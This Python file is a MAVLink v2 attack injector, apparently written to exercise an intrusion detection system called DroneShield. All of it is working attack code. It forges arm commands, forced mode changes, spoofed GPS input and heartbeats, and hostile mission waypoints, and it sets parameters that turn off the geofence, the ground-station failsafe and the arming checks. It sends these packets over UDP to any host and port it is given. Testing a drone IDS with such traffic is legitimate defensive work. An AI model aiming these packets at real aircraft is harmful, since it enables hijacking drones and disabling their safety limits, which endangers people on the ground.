"""
DroneShield — Attack Injector
Crafts raw MAVLink v2 packets and injects them into the IDS proxy (port 14551).
Attack types: ARM injection, GPS spoofing, forced mode change, param tamper,
              mission injection, heartbeat spoofing.
"""
import socket
import struct
import time
import argparse
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s [ATTACKER] %(message)s")

# MAVLink message IDs
HEARTBEAT     = 0
SET_MODE      = 11
PARAM_SET     = 23
MISSION_ITEM  = 39
MISSION_COUNT = 44
COMMAND_LONG  = 76
GPS_INPUT     = 232

CMD_ARM_DISARM = 400
CMD_TAKEOFF    = 21
CMD_LAND       = 20

CRC_EXTRA = {
    HEARTBEAT:     50,
    SET_MODE:      89,
    PARAM_SET:     168,
    MISSION_ITEM:  254,
    MISSION_COUNT: 221,
    COMMAND_LONG:  152,
    GPS_INPUT:     151,
}

_seq = 0


def mavlink_crc(data: bytes) -> int:
    crc = 0xFFFF
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp ^= (tmp << 4) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


def build_mavlink(msg_id: int, payload: bytes, sys_id: int = 99, comp_id: int = 1) -> bytes:
    global _seq
    _seq = (_seq + 1) & 0xFF
    payload_len = len(payload)
    header = bytes([
        0xFD,           # magic
        payload_len,    # payload length
        0,              # incompat_flags
        0,              # compat_flags
        _seq,           # seq
        sys_id,         # sys_id  (99 = fake/unknown GCS)
        comp_id,        # comp_id
        msg_id & 0xFF,
        (msg_id >> 8) & 0xFF,
        (msg_id >> 16) & 0xFF,
    ])
    crc_data = header[1:] + payload
    if msg_id in CRC_EXTRA:
        crc_data += bytes([CRC_EXTRA[msg_id]])
    crc = mavlink_crc(crc_data)
    return header + payload + struct.pack("<H", crc)


def build_heartbeat() -> bytes:
    payload = struct.pack("<IBBBBB", 0, 6, 8, 81, 4, 3)
    return build_mavlink(HEARTBEAT, payload)


def build_heartbeat_sys(sys_id: int) -> bytes:
    """Build a HEARTBEAT with a specific sys_id for spoofing."""
    payload = struct.pack("<IBBBBB", 0, 6, 8, 81, 4, 3)
    return build_mavlink(HEARTBEAT, payload, sys_id=sys_id)


def build_arm_command(arm: bool = True) -> bytes:
    param1 = 1.0 if arm else 0.0
    payload = struct.pack("<fffffffHBBB",
        param1, 0, 0, 0, 0, 0, 0,
        CMD_ARM_DISARM,
        1, 1, 0,
    )
    return build_mavlink(COMMAND_LONG, payload)


def build_mode_change(mode: int) -> bytes:
    payload = struct.pack("<IBB", mode, 1, 217)
    return build_mavlink(SET_MODE, payload)


def build_gps_input(lat: float, lon: float, alt: float = 50.0) -> bytes:
    time_usec = int(time.time() * 1e6)
    lat_int = int(lat * 1e7)
    lon_int = int(lon * 1e7)
    payload = struct.pack("<QBHIHBiifffffffff B",
        time_usec, 0, 0, 0, 0, 3,
        lat_int, lon_int, alt,
        1.5, 2.0, 0.5,
        0.0, 0.0, 0.0,
        1.2, 1.8, 8,
    )
    return build_mavlink(GPS_INPUT, payload)


def build_param_set(param_id: str, value: float) -> bytes:
    """PARAM_SET: modify autopilot parameter (msg_id=23, CRC_EXTRA=168)."""
    payload = struct.pack(
        "<f16sBBB",
        value,
        param_id.encode()[:16].ljust(16, b'\x00'),
        1, 1, 9,
    )
    return build_mavlink(PARAM_SET, payload)


def build_mission_count(count: int) -> bytes:
    """MISSION_COUNT: announce mission upload (msg_id=44, CRC_EXTRA=221)."""
    payload = struct.pack("<HBBB", count, 1, 0, 0)
    return build_mavlink(MISSION_COUNT, payload)


def build_mission_item(seq: int, lat: float, lon: float, alt: float) -> bytes:
    """MISSION_ITEM: inject a hostile waypoint (msg_id=39, CRC_EXTRA=254)."""
    payload = struct.pack(
        "<fffffffiiHHBBBBB",
        0, 0, 0, 0,
        int(lat * 1e7), int(lon * 1e7), alt,
        seq, 16, 1, 1, 3, 0, 1,
    )
    return build_mavlink(MISSION_ITEM, payload)


class Attacker:
    def __init__(self, target_host: str = "127.0.0.1", target_port: int = 14551):
        self.target = (target_host, target_port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send(self, pkt: bytes) -> None:
        self.sock.sendto(pkt, self.target)

    def attack_arm_inject(self) -> None:
        logging.warning("ATTACK: ARM INJECTION")
        for _ in range(3):
            self.send(build_arm_command(arm=True))
            time.sleep(0.1)

    def attack_gps_spoof(self, base_lat: float = 37.7749, base_lon: float = -122.4194,
                          duration: float = 30.0, steps: int = 60) -> None:
        logging.warning("ATTACK: GPS SPOOFING — slow drift over 30s")
        for i in range(steps):
            frac = i / steps
            lat = base_lat + frac * 0.01
            lon = base_lon + frac * 0.005
            pkt = build_gps_input(lat, lon)
            self.send(pkt)
            time.sleep(duration / steps)

    def attack_mode_change(self, target_mode: int = 6) -> None:
        logging.warning(f"ATTACK: FORCED MODE CHANGE → mode {target_mode}")
        for _ in range(3):
            self.send(build_mode_change(target_mode))
            time.sleep(0.1)

    def flood(self, count: int = 50, interval: float = 0.02) -> None:
        logging.warning("ATTACK: PACKET FLOOD")
        for _ in range(count):
            self.send(build_heartbeat())
            time.sleep(interval)

    def attack_param_tamper(self) -> None:
        """Send PARAM_SET to disable geofence, GCS failsafe, and arming checks."""
        logging.warning("ATTACK: PARAM TAMPER — disabling safety parameters")
        params = [
            ("FENCE_ACTION",  0.0),
            ("FS_GCS_ENABLE", 0.0),
            ("ARMING_CHECK",  0.0),
        ]
        for param_id, value in params:
            self.send(build_param_set(param_id, value))
            time.sleep(0.05)

    def attack_mission_inject(self, target_lat: float, target_lon: float) -> None:
        """Upload a replacement mission directing the drone to hostile coordinates."""
        logging.warning(f"ATTACK: MISSION INJECT → ({target_lat}, {target_lon})")
        self.send(build_mission_count(1))
        time.sleep(0.05)
        self.send(build_mission_item(0, target_lat, target_lon, 100.0))

    def attack_heartbeat_spoof(self) -> None:
        """Send 20 heartbeats cycling sys_id 40–59 to flood trust registry."""
        logging.warning("ATTACK: HEARTBEAT SPOOF — cycling sys_ids 40–59")
        for i in range(20):
            spoof_id = 40 + (i % 20)
            self.send(build_heartbeat_sys(spoof_id))
            time.sleep(0.1)

    def run_all_attacks(self) -> None:
        logging.warning("=== Starting all attack sequences ===")
        time.sleep(1)
        self.attack_arm_inject()
        time.sleep(2)
        self.attack_mode_change()
        time.sleep(2)
        self.attack_param_tamper()
        time.sleep(1)
        self.attack_mission_inject(38.897, -77.036)
        time.sleep(1)
        self.attack_heartbeat_spoof()
        time.sleep(1)
        self.attack_gps_spoof()
        logging.warning("=== Attack sequence complete ===")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DroneShield MAVLink Attacker")
    parser.add_argument("--host",   default="127.0.0.1")
    parser.add_argument("--port",   type=int, default=14551)
    parser.add_argument("--attack",
                        choices=["arm", "gps", "mode", "flood", "param", "mission", "spoof", "all"],
                        default="all")
    parser.add_argument("--mode-id",     type=int,   default=6)
    parser.add_argument("--target-lat",  type=float, default=38.897)
    parser.add_argument("--target-lon",  type=float, default=-77.036)
    args = parser.parse_args()

    attacker = Attacker(args.host, args.port)
    attacks = {
        "arm":     attacker.attack_arm_inject,
        "gps":     attacker.attack_gps_spoof,
        "mode":    lambda: attacker.attack_mode_change(args.mode_id),
        "flood":   attacker.flood,
        "param":   attacker.attack_param_tamper,
        "mission": lambda: attacker.attack_mission_inject(args.target_lat, args.target_lon),
        "spoof":   attacker.attack_heartbeat_spoof,
        "all":     attacker.run_all_attacks,
    }
    attacks[args.attack]()
